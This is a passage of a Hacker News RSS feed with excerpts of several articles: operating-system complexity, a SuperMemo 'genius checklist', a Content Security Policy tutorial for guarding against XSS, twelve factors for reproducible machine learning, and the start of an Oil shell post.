computer the OS is running on actually looks like. On x86, this
involves parsing countless bitfields, tables, executing byte code
provided by the firmware, probing individual features, etc. The most
painful example of this I‚Äôve seen so far is figuring out which
interrupt a particular PCI interrupt line is routed to. It‚Äôs worth a
set of posts, but until then, feel free to checkout <a href="https://habr.com/en/post/501912/">this
description</a>. (If it‚Äôs down, it‚Äôs
also cached by
<a href="https://webcache.googleusercontent.com/search?q=cache:CXZUV61m7hwJ:https://habr.com/en/post/501912/+&amp;cd=1&amp;hl=en&amp;ct=clnk">Google</a>.)</p>

<p>The second issue is <strong>resource management</strong>. Essentially, how do you
hand out and eventually reclaim all the resources you discovered. For
some workloads performance matters here, so this code is usually
written with speed in mind.</p>

<p>The third reason is that at compile time the <strong>workload</strong> is
unclear. So the kernel has to assume the worst. It must be ready to
start a couple of hundred VMs or create a thousand TCP sockets in a
blink of an eye, because there is no way to know what‚Äôs going to
happen or what the actual requirements are.</p>

<p>A fun exercise is to checkout the <a href="https://elixir.bootlin.com/linux/v5.9.1/source/virt/kvm/kvm_main.c#L739">KVM code for creating
VMs</a>. Try
to follow
<a href="https://elixir.bootlin.com/linux/v5.9.1/source/arch/x86/kvm/x86.c#L9904">the</a>
<a href="https://elixir.bootlin.com/linux/v5.9.1/source/arch/x86/kvm/vmx/vmx.c#L7059">code</a>
to where the actual VM is created in hardware. <em>Spoiler:</em> There is
none. It‚Äôs all figuring out what the platform can do and then setting
up a bunch of spinlock, mutexes, lists, arrays, structs, ‚Ä¶</p>

<p>I don‚Äôt want to pick on KVM in particular. I think it‚Äôs pretty ok as
far as Linux kernel code goes. Operating System kernel code is mostly
like this: A lot of really mind numbing platform discovery and
resource management code written for speed assuming the worst case
requirements in a language that doesn‚Äôt do parsing, resource
management or concurrency well (among other things).</p>

<p>People take this all for granted. But when I look around, I see many
systems that don‚Äôt need this complexity and where it is only a safety
and security burden. Consider most appliance-type products, e.g. a
Wi-Fi router. Or a system that runs one service on a cloud VM. You
know everything in advance!</p>

<p>If you read until this point, you are probably asking yourself, where
I am going with this. If you think <a href="https://en.wikipedia.org/wiki/Separation_kernel">separation
kernel</a>, you are
right. My rough plan to write a couple of more posts to flesh out the
idea of doing all the complicated OS parts at compile time and how
this results in an incredibly simple, secure, and efficient system at
runtime. There will be <a href="https://riscv.org/">RISC-V</a>,
<a href="https://www.haskell.org/">Haskell</a>, <a href="https://dhall-lang.org/">Dhall</a>,
and <a href="https://www.rust-lang.org/">Rust</a> content.</p>

<p>Stay tuned.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949983</guid>
            <pubDate>Sat, 31 Oct 2020 09:06:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Genius Checklist]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949932">thread link</a>) | @rajlego
<br/>
October 31, 2020 | https://supermemo.guru/wiki/Genius_checklist | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Genius_checklist">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p>


<p><small>Compiled on the basis of the original list presented here: <i><a href="http://super-memory.com/articles/genius.htm">Roots of genius and creativity</a></i>, <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2001)</small>
</p>
<h2><span id="How_to_become_a_genius">How to become a genius</span></h2>
<p>A majority of people carry the potential to become a genius. There are factors that are far <a href="https://supermemo.guru/wiki/Simple_formula_for_high_intelligence" title="Simple formula for high intelligence">more important than genes and IQ</a>. I have compiled a checklist that I believe should work, when followed. All you need to begin with is to be free and reasonably healthy. I try to list the factors that prevent many people from accomplishing their greatest potential. The list begins with the stumbling blocks that are most likely to occur on one's road to genius. Some factors need to be balanced against each other, and some factors overlap. For example, the first three preconditions of genius are strongly related: freedom from <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a>, <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">good sleep</a>, and <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. They may provide the key to answering why we are not (yet) a planet of geniuses. I listed individual points separately on the basis of their ability to motivate and inspire. Before you start reading, however, remember what Herbert Simon said about genius: it takes about ten years to develop it. Not only will you have to meet all the criteria listed below, but lots of hard work and patience will be required before you climb that summit!
</p>
<p>If you follow these rules religiously, you will be amazed by how much progress you can make in a decade</p> 
<p>If I scare you with a decade-long time-frame, remember that chances are good that you will love your self-transformation in weeks. The younger you are, the 'messier' your life, the less you know about your future, the more powerful the effect.
</p>
<h3><span id="Eliminate_stress">Eliminate stress</span></h3>
<p>Stress is understood here as rapid change resulting in an increase in stress hormones (catecholamines, ACTH, cortisol, etc.). Stressful change can come from conflict, illness, the death of a relative, or unemployment. Stress can also result from seemingly happy events such as a wedding or a hasty vacation. A simple test here is to make sure that creative problems circulate in your mind while you are brushing your teeth. You will fail the test if, instead of creative thinking, you are preoccupied with problems at work or in the family. Stress will dramatically cut down your creative efficiency. Most of all, it will affect your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>: another cornerstone of genius. In addition, <a href="https://supermemo.guru/wiki/Chronic_stress" title="Chronic stress">chronic stress</a> will result in excess cortisol, increased activity in the sympathetic system, and a resulting inhibition of neurogenesis, memory consolidation, creativity, and more. See: <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">Stress resilience</a>
</p>
<h3><span id="Sleep">Sleep</span></h3>
<p>Make sure to always get as much quality sleep as <a href="https://supermemo.guru/wiki/Free_running_sleep" title="Free running sleep">your brain requires</a>. The simplest first step is: <a href="https://supermemo.guru/wiki/Kill_the_alarm_clock" title="Kill the alarm clock">throw away your alarm clock</a>! Lack of sleep delivers a quadruple whammy: (1) it suppresses memory consolidation, (2) it prevents <a href="https://supermemo.guru/wiki/Memory_optimization_in_sleep" title="Memory optimization in sleep">memory optimization</a>, (3) it makes you unwilling to exert mental effort, and (4) it undermines your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. Submit to the <a href="https://supermemo.guru/wiki/Natural_creativity_cycle" title="Natural creativity cycle">natural creativity cycle</a>. For more see: <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">Science of sleep</a>
</p>
<h3><span id="Self-discipline">Self-discipline</span></h3>
<p>Lack of self-discipline aggravated by stress and a lack of sleep is the number one cause of low productivity. The trick to achieving good self-discipline is to make incremental progress, and convert discipline into a habit and then into the pleasure of productivity (for more see: <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">Self-discipline</a>).
If you develop healthy self-discipline habits early, your life is likely to take an entirely different course. If you believe you are lacking in this field, try the following exercise: as soon as a valuable activity comes to your mind that you are really unwilling to do, <b>do it</b>. Within the scope and in agreement with human biology, your rational brain must be the master of your decision making. Stand over a pool of cold water. Do you hate jumping in? The more you hate it, the sooner you should jump. And in the end you will <a href="https://supermemo.guru/wiki/Winter_swimming" title="Winter swimming">love it</a>. A cold shower is a minor inconvenience once you experience the volitional power of the brain. You need to master the skill of perfect execution of your own plans. The more precise your plan, the harder it is to execute, yet the more tangible the results. Learn to delay gratification. If you focus on your long-term goals, your daily inconveniences will be more bearable or even pleasurable. A strenuous quest towards the goal is the best reward for a genius mind. Minor awards of laziness do not befit a true genius. Think of self-discipline daily. Even the strongest minds can relax it all too easily. Remember about stress and sleep. Stress and sleepiness are chief factors that undermine self-discipline. Self-discipline cannot quarrel with biology. In extreme cases, it can actually <a href="https://supermemo.guru/wiki/War_of_the_networks" title="War of the networks">undermine your genius</a>. If you are sick, stop working. If you are sleepy, go to sleep. For comfort, you should know, that with each passing year, self-discipline will gradually transform into a pleasure. Not only will you <a href="https://supermemo.guru/wiki/Plan" title="Plan">execute your plans instinctively</a>, you will also reap the benefits of your earlier efforts to steer your life in a good direction. In later years, you will not need much self-discipline to employ your genius mind to do good things.
</p>
<h3><span id="Learn_day_and_night">Learn day and night</span></h3>
<p>Knowledge is the substance you <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">convert to great ideas</a>. Although it is possible to learn in stress or in a <a href="https://supermemo.guru/wiki/Sleep_deprivation" title="Sleep deprivation">sleep deficit</a>, learning is listed here behind stress, sleep and self-discipline. This is because humans exhibit <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">inborn curiosity</a> that makes them crave learning. TV, tabloid press, and social media thrive on this need for learning. Most people understand the importance of learning but are prevented from executing their plans due to stress, lack of sleep or lack of self-discipline. To breed genius, your whole life should revolve around learning. You should use every single little opportunity to learn important things. This could be reading Einstein's biography or talking with a homeless person. Read, talk, watch, surf, and keep on thinking. Do not avoid hard subjects (e.g. mathematics). Mold your learning strictly to your creative needs, but do not fail to explore a wide range of topics. Touch all the bases and avoid tunnel vision! Remember that your success in learning will require appropriate <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">knowledge representation</a> and timing of review (as in <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>). Are you lacking a university education? <a href="https://supermemo.guru/wiki/School_dropouts" title="School dropouts">Never mind</a>. Look at Edison, Lincoln, or Leibnitz to see the power of <a href="https://supermemo.guru/wiki/Self-learning" title="Self-learning">self-instruction</a>. All the seemingly contradictory requirements listed above can be reconciled if you structure your learning with <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>. See: <a href="https://supermemo.guru/wiki/Advantages_of_incremental_reading" title="Advantages of incremental reading">Advantages of incremental reading</a>
</p>
<h3><span id="Abstract_knowledge">Abstract knowledge</span></h3>
<p>Except for a great deal of learning, you will need to pay attention to the <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">quality of knowledge</a> and its general <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a>. You cannot just memorize thousands of facts. You have to consciously explore areas such as logic, probability, statistics, game theory, decision theory, computing sciences, optimization, as well as other branches of mathematics and sciences. You have to develop a love for logical thinking, the scientific method, and skepticism. Even if you are a movie critic, you will still need quality logic to frame your judgment. Remember that all knowledge is volatile and may be subject to falsification at any time. Keep your mind open to new truths even if they seem to turn your present vision of the world upside down
</p>
<h3><span id="Knowledge_representation">Knowledge representation</span></h3>
<p>The main thing that makes a genius brain stand out is its ability to store <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">quality knowledge</a> in a way that is <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">easy to remember</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">easy to use</a>. A genius mind can see complex things in a simple form. It looks at the same text or picture and sees a dozen times more than an average individual. An average reader will say: <i>"I understand, so what?"</i>. A genius reader will say: <i>"Eureka!"</i>, and list several applications of the just acquired piece of knowledge. Geniuses simplify while learning. They <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalize</a>. They build <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract models</a>. They develop abstract languages for representing knowledge. Those representation skills can also be developed by training. Have you ever tried to learn Kanji (Japanese language symbols)? If you see Kanji as a tangle of confused sticks, you are a typical beginner. Over time, however, Kanji symbols should begin to sing to you and talk to you in their own language. Once you pass the first few hundred, the next thousand should go smoothly. The same happens if you learn the 20x20 multiplication table. With time you learn simple tricks for running simple and repetitive calculations. Instead of memorizing 20x20 combinations, you limit yourself to a standard 10x10 table (just 25% of all combinations) and add to this a few rules for manipulating numbers in your <a href="https://supermemo.guru/wiki/Working_memory" title="Working memory">working memory</a>. The best way to develop good representations is to (1) understand the way the memory works (see: <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">20 rules of formulating knowledge</a>), (2) consciously modify representations in the learning process (e.g. <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a> supports this process naturally) (3) work on <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> (the more you learn the easier it becomes), and (4) get <a href="https://supermemo.guru/wiki/Good_sleep" title="Good sleep">good sleep</a> to employ <a href="https://supermemo.guru/wiki/Neural_optimization_in_sleep" title="Neural optimization in sleep">neural optimization in sleep</a>. If you encounter a difficult problem in <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>, postpone it. With luck, some other information source will present to you a better representation that is easier to assimilate.
</p>
<h3><span id="Health">Health</span></h3>
<p>Take obsessive care of your health! Keep your blood pressure down (high blood pressure damages your brain), do not <a href="https://supermemo.guru/wiki/Impact_of_alcohol_on_sleep" title="Impact of alcohol on sleep">abuse alcohol</a> (any dose that visibly affects your mental performance may be poisonous to your brain), use medication only when absolutely necessary, exercise, stay away from smoking or illicit drugs, learn medical sciences!!! Your brain is a highly sensitive organ that needs a healthy environment to operate in. Health and understanding of the biological needs of your brain may dramatically affect your performance in the long run. Don't waste time on <a href="https://supermemo.guru/wiki/Formula_for_common_cold_prevention" title="Formula for common cold prevention">colds and flu</a>
</p>
<h3><span id="Negative_emotion">Negative emotion</span></h3>
<p>Learn to control and eliminate negative emotions that blur your mind and long-term vision. The only acceptable feelings towards others should be positive, in particular ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://supermemo.guru/wiki/Genius_checklist">https://supermemo.guru/wiki/Genius_checklist</a></em></p>]]>
            </description>
            <link>https://supermemo.guru/wiki/Genius_checklist</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949932</guid>
            <pubDate>Sat, 31 Oct 2020 08:47:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Content Security Policy ‚Äì protect your website from XSS attacks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949793">thread link</a>) | @tsl143
<br/>
October 31, 2020 | https://itsopensource.com/content-security-policy/ | <a href="https://web.archive.org/web/*/https://itsopensource.com/content-security-policy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>October 25, 2020</p></header><section><h3>Problem</h3>
<p>It‚Äôs very common while building any project we use certain third party libraries, in the case of Javascript; <code>npm packages</code>, which recursively use more packages, and eventually your code includes a huge chunk of third party code.<br>
There is nothing wrong with it, there is no point re-inventing the wheel. We include the required library, make our code work, write tests. Deploy to a staging environment, pass through automation and finally deploy to production.  </p>
<p>The problem is when a library tries to load remote content on our website. It can be an image, font, style, or even Javascript. This content bypasses all our tests, checks, and is executed directly on production. Even worse we don‚Äôt know where the content is being served from.</p>
<h3>Content Security Policy</h3>
<p>Content Security Policy (CSP) is a <a href="https://www.w3.org/TR/CSP3/">W3C specification</a> that helps to avoid <code>XSS</code> attacks. CSP enables developers to define rules for fetching the resources(images, javascript, fonts, etc.) on the client browser. Developers can define policies to allow/restrict loading any resource, restrict resources to load only from certain domains, and disallow from any other domain. For example, you can write a CSP to restrict browsers to load images only from <code>example.com</code>, any images from other domains will be not loaded and would throw errors. In addition to resources, CSP also offers control over the embeds.<br>
In the following example, the CSP forces to load images/scripts only from self domain and prevents the loading of images from other domains.</p>
<p><span>
      <a href="https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/09e48/csp1.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="CSP block" title="CSP block" src="https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/fcda8/csp1.png" srcset="https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/12f09/csp1.png 148w,
https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/e4a3f/csp1.png 295w,
https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/fcda8/csp1.png 590w,
https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/efc66/csp1.png 885w,
https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/09e48/csp1.png 974w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p><em>From the <a href="https://www.w3.org/TR/CSP3/">W3c specification</a> docs:</em> </p>
<blockquote>
<p>One of the CSP goal is to mitigate the risk of content-injection attacks by giving developers fairly granular control over</p>
<ul>
<li>The resources which can be requested (and subsequently embedded or executed) on behalf of a specific Document or Worker</li>
<li>The execution of inline script</li>
<li>Dynamic code execution (via eval() and similar constructs)</li>
<li>The application of inline style</li>
</ul>
</blockquote>
<h3>How</h3>
<p>CSP can be implemented in following two ways:</p>
<ol>
<li>
<p>Specify in <strong>HTTP headers</strong> </p>
<div data-language="text"><pre><code>Content-Security-Policy: __Policy__</code></pre></div>
</li>
<li>
<p>Specify in <strong>META tags</strong> </p>
<div data-language="html"><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>Content-Security-Policy<span>"</span></span> <span>content</span><span><span>=</span><span>"</span> __Policy__ <span>"</span></span><span>&gt;</span></span></code></pre></div>
</li>
</ol>
<h4>Defining a policy</h4>
<p>The Policy is the accumulation of directives which defines the allowed location of each resource, no directive means allowed for all. Some of the useful directives are the following:</p>
<ul>
<li><em>default-src</em> : This defines the loading policy for all types of resources.</li>
<li><em>script-src</em> : This defines the loading policy for all javascript, from where javascript can be loaded.</li>
<li><em>img-src</em> : This defines the loading policy for all images, from where images can be loaded. </li>
</ul>
<p>List of directives for the other resources is <a href="https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources">here</a>.</p>
<p>Some examples of policies are:</p>
<ol>
<li>
<div data-language="text"><pre><code>Content-Security-Policy: default-src 'self';</code></pre></div>
<p>This would allow resources only from the same domain, and all other resources will fail to load.</p>
</li>
<li>
<div data-language="text"><pre><code>Content-Security-Policy: img-src example.com;</code></pre></div>
<p>This would allow images only from <code>example.com</code>, and all other images will fail to load.</p>
</li>
<li>
<div data-language="text"><pre><code>Content-Security-Policy: default-src 'self'; img-src example.com;</code></pre></div>
<p>This would allow any resources to load only if from the same domain, except images which can be from <code>example.com</code> too.</p>
</li>
</ol>
<h4>Reporting</h4>
<p>CSP also provides a way to send violation reports, in case any logging is required, via <code>report-uri</code> directive. </p>
<div data-language="text"><pre><code>`Content-Security-Policy: default-src 'self'; report-uri http://example.com/cspfails` </code></pre></div>
<p>The reports will be sent as POST request and with following JSON: </p>
<div data-language="json"><pre><code><span>{</span>
 <span>"csp-report"</span><span>:</span> <span>{</span>
   <span>"document-uri"</span><span>:</span> <span>"http://example.com/"</span><span>,</span>
   <span>"referrer"</span><span>:</span> <span>""</span><span>,</span>
   <span>"blocked-uri"</span><span>:</span> <span>"http://example.com/some_malware.js"</span><span>,</span>
   <span>"violated-directive"</span><span>:</span> <span>"default-src self"</span><span>,</span>
   <span>"original-policy"</span><span>:</span> <span>"default-src 'self'; report-uri http://example.com/cspfails"</span>
 <span>}</span>
<span>}</span></code></pre></div>
<br>
<h3>Risks</h3>
<p>Before defining a CSP you should be completely aware of all the resources and respective origin required for your webapp, else some vital resources may be blocked and eventually random bugs.
In case you are not sure what all resources are being required for running your web page smoothly, you can implement the CSP in reporting mode, in this way the violations will be reported but no resource will be blocked, once you are sure what are the resources really required, you can implement CSP. To do this instead of <code>Content-Security-Policy</code> we need to use <code>Content-Security-Policy-Report-Only</code> header. </p>
<div data-language="text"><pre><code>Content-Security-Policy-Report-Only: __Policy__ + report-uri</code></pre></div>
<h3>Resources</h3>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></li>
<li><a href="https://owasp.org/www-community/attacks/Content_Security_Policy">https://owasp.org/www-community/attacks/Content_Security_Policy</a></li>
</ul></section><hr></article></div>]]>
            </description>
            <link>https://itsopensource.com/content-security-policy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949793</guid>
            <pubDate>Sat, 31 Oct 2020 07:55:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 12 Factors of reproducible Machine Learning in production]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949736">thread link</a>) | @benkoller
<br/>
October 31, 2020 | https://blog.maiot.io/12-factors-of-ml-in-production/ | <a href="https://web.archive.org/web/*/https://blog.maiot.io/12-factors-of-ml-in-production/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-content">
    <div id="blogpost">
        <p>The last two decades have yielded us some great understandings about Software Development. A big part of that is due to the emergence of DevOps and it√¢‚Ç¨‚Ñ¢s wide adoption throughout the industry.</p>

<p>Leading software companies follow identical patterns: Fast iterations in software development followed by Continuous Integration, Continuous Delivery, Continuous Deployment. Every artefact is tested on its ability to provide value, always has a state of readiness and is deployed through automation.</p>

<p>As a field, Machine Learning differs from traditional software development, but we can still borrow many learnings and adapt them to √¢‚Ç¨≈ìour√¢‚Ç¨ÔøΩ industry. For the last few years, we√¢‚Ç¨‚Ñ¢ve been doing Machine Learning projects in production, so beyond proof-of-concepts, and our goals where the same is in software development: reproducibility. So we built a pipeline orchestrator, strong automations and established a workflow to achieve exactly that.</p>

<p>Why not just Jupyter Notebooks? Well, how long does it take to construct a Notebook from scratch, with all processing steps, from scratch? And how easy is it to onboard new members to the team? Can you reproduce the results you√¢‚Ç¨‚Ñ¢ve had two months ago, now, fast? Can you compare today√¢‚Ç¨‚Ñ¢s results against historic one√¢‚Ç¨‚Ñ¢s? Can you give provenance over your data throughout training? And what happens if your model goes stale?</p>

<p>We√¢‚Ç¨‚Ñ¢ve faced all of these issues, and more, and now took our experience to deduce 12 factors (as a nod to the <a href="https://12factor.net/">12 factor app</a>) that build the backbone of successful ML in production.</p>

<h2 id="1-versioning">1. Versioning</h2>

<p>While obvious to basically all Software Engineers, version control is not an universally accepted methodology among Data Scientists. Let me quote the folks at Gitlab as a quick primer:</p>

<blockquote>
  <p>Version control facilitates coordination, sharing, and collaboration across the entire software development team. Version control software enables teams to work in distributed and asynchronous environments, manage changes and versions of code and artifacts, and resolve merge conflicts and related anomalies.</p>
</blockquote>

<p>In short, versioning lets you safely manage the moving parts of Software Development.</p>

<p>As a special form of Software Development, Machine Learning has unique requirements. First, it has not one but two moving parts: Code and Data. Second, model trainings happen in (fast) iterations and introduce a high variance of code (e.g. splitting, preprocessing, models).</p>

<p>As soon as data can be subject to change it needs to be versioned to be able to reproducibly and repeatably conduct experiments and train models. Cruder forms of versioning (read: hard-copies) can go a long way, but especially in team scenarios shared, immutable version control becomes critical.</p>

<p>Version control of code is even more key. In addition to above√¢‚Ç¨‚Ñ¢s quote, preprocessing code is not just relevant at training but also at serving time and needs to be immutably correlatable with models. Serverless functions can provide an easy-access way to achieve a middle ground between the workflow of Data Scientists and production-ready requirements.</p>

<p><strong>TL;DR:</strong> You need to version your code, and you need to version your data.</p>

<h2 id="2-explicit-feature-dependencies">2. Explicit feature dependencies</h2>

<p>In a perfect world, whatever produces your input data will forever produce exactly the same data, at least structurally. But the world is not perfect, you√¢‚Ç¨‚Ñ¢re consuming data from an upstream service that√¢‚Ç¨‚Ñ¢s built by humans and might be subject to change. Features will change, eventually. At best, your models fail outright, but at worst they√¢‚Ç¨‚Ñ¢ll just silently start to produce garbage results.</p>

<p>Explicitly defined feature dependencies allow for transparent failure as early as possible. Well-designed systems will accommodate feature dependencies both in continuous training as well as at serving time.</p>

<p><strong>TL;DR:</strong> Make your feature dependencies explicit in your code.</p>

<h2 id="3-descriptive-training-and-preprocessing">3. Descriptive training and preprocessing</h2>

<p>Good software is descriptive - it can be read and understood easily without reading every line of code.</p>

<p>And while Machine Learning is a unique flavor of Software Development it doesn√¢‚Ç¨‚Ñ¢t exempt practitioners from following established coding guidelines. Basic understanding of coding standard essentials can be picked up with very little effort and in a short amount of time.</p>

<p>Code for both preprocessing and models should follow <a href="https://www.python.org/dev/peps/pep-0008/">PEP8</a>. It should consist of meaningful object names and contain helpful comments. Following PEP8 will improve code legibility, reduce complexity and speed up debugging. Programming paradigms such as <a href="https://en.wikipedia.org/wiki/SOLID">SOLID</a> provide thought frameworks to make code more maintainable, understandable and flexible for future use cases.</p>

<p>Configuration should be separated from code. Don√¢‚Ç¨‚Ñ¢t hardcode your split ratios, provide them at runtime through configuration. As known from hyperparameter tuning, a well-separated configuration increases speed of iterations significantly and makes codebases reusable.</p>

<p><strong>TL;DR:</strong> Write readable code and separate code from configuration.</p>

<h2 id="4-reproducibility-of-trainings">4. Reproducibility of trainings</h2>

<p>If you can√¢‚Ç¨‚Ñ¢t reproduce training results you can√¢‚Ç¨‚Ñ¢t trust the results. While this is somewhat the overarching theme of this blogpost, there are nuances to reproducibility. Not just do you need to be able to reproduce a training yourself, the entire team should be able to do so. Obscuring trainings in Jupyter Notebooks on someones PC or on some VM on AWS is the literal inverse of a reproducible training.</p>

<p>By using pipelines to train models entire teams gain both access and transparency over conducted experiments and training runs. Bundled with a reusable codebase and a separation from configuration, everyone can successfully relaunch any training at any point in time.</p>

<p><strong>TL;DR:</strong> Use pipelines and automation.</p>

<h2 id="5-testing">5. Testing</h2>

<p>Testing comes in many shapes and forms. To give two examples:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Unit_testing">Unit testing</a> is testing on an atomic level - every function is tested individually on it√¢‚Ç¨‚Ñ¢s own specific criteria.</li>
  <li><a href="https://en.wikipedia.org/wiki/Integration_testing">Integration testing</a> is taking an inverse approach - all elements of a codebase are tested as a group, in conjunction and with clones/mocks of up- and downstream services.</li>
</ul>

<p>Both paradigms are good starting points for Machine Learning. Preprocessing code is predestined for unit testing - do transforms yield the right results given various inputs? Models are a great use case for integration tests - does your model produce comparable results to evaluation at serving time in a production environment?</p>

<p><strong>TL;DR:</strong> Test your code, test your models.</p>

<h2 id="6-drift--continuous-training">6. Drift / Continuous training</h2>

<p>Drift is a legit problem for production scenarios. You need to account for drift as soon as there is even a slight possibility that data might change (e.g. user input, upstream service volatility). Two measures can mitigate risk exposure:</p>

<ul>
  <li>Data monitoring for production systems. Establish automated reporting mechanisms to alert teams of changing data, even beyond explicitly defined feature dependencies.</li>
  <li>Continuous training on newly incoming data. Well-automated pipelines can be rerun on newly recorded data and offer comparability to historic training results to show performance degradation as well as offer a quick way to promote newly trained models into production, given better model performance.</li>
</ul>

<p><strong>TL;DR:</strong> If you data can change run a continuous training pipeline.</p>

<h2 id="7-tracking-of-results">7. Tracking of results</h2>

<p>Excel is not a good way to track experiment results. And not just Excel, any decentralized, manual form of tracking will yield non-authoritative and therefore untrustworthy information.</p>

<p>The right approach are automated methods to record training results in a centralized data store. Automation ensures the reliable tracking of every training run, and allows for a later comparability of training runs against each other. Centralized storage of results give transparency across teams and allows for continuous analysis.</p>

<p><strong>TL;DR:</strong> Track results via automation.</p>

<h2 id="8-experimentation-vs-production-models">8. Experimentation vs Production models</h2>

<p>Understanding datasets requires effort. Commonly, this understanding is gathered through experimentation, especially when operating in fields with a lot of hidden domain knowledge. Start a Jupyter Notebook, get some/all of the data into a Pandas Dataframe, do some hours of out-of-sequence magic, train a first model, evaluate results - Job done. Well, unfortunately not.</p>

<p>Experiments serve a purpose in the lifecycle of Machine Learning. The results of these Experiments are however not models, but understanding. Models from explorative Jupyter Notebooks are proof for understanding, not production-ready artefacts. Gained understanding will need more molding and fitting into production-ready training pipelines.</p>

<p>All understandings unrelated to domain-specific knowledge can however be automated. Generate statistics on each data version you√¢‚Ç¨‚Ñ¢re using to skip any one-time, ad-hoc exploratory work you might have had to do in Jupyter Notebooks, and move straight to the first pipelines. The earlier you experiment in pipelines, the earlier you can collaborate on intermediate results and the earlier you√¢‚Ç¨‚Ñ¢ll receive production-ready models.</p>

<p><strong>TL;DR:</strong> Notebooks are not production-ready, so experiment in pipelines early on.</p>

<h2 id="9-training-serving-skew">9. Training-Serving-Skew</h2>

<p>The avoidance of skewed training and serving environments is often reduced to correctly embedding all data preprocessing into the model serving environments. This is absolutely correct, and you need to adhere to this rule. However, it is also a too narrow interpretation of Training-Serving-Skew.</p>

<p>A little detour to ancient DevOps history: In 2006 the CTO of Amazon, Werner Vogels, coined the term √¢‚Ç¨≈ìYou build it, you run it√¢‚Ç¨ÔøΩ. It√¢‚Ç¨‚Ñ¢s a descriptive phrase for extending the responsibility of Developers to not only writing but also running the software they build.</p>

<p>A similar dynamic is required for Machine Learning projects - an understanding of both the upstream generation of data and the downstream usage of generated Models is within the responsibility of Data Scientists. What system generates your data for ‚Ä¶</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.maiot.io/12-factors-of-ml-in-production/">https://blog.maiot.io/12-factors-of-ml-in-production/</a></em></p>]]>
            </description>
            <link>https://blog.maiot.io/12-factors-of-ml-in-production/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949736</guid>
            <pubDate>Sat, 31 Oct 2020 07:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Big Changes to the Oil Language]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949731">thread link</a>) | @todsacerdoti
<br/>
October 31, 2020 | http://www.oilshell.org/blog/2020/10/big-changes.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/10/big-changes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
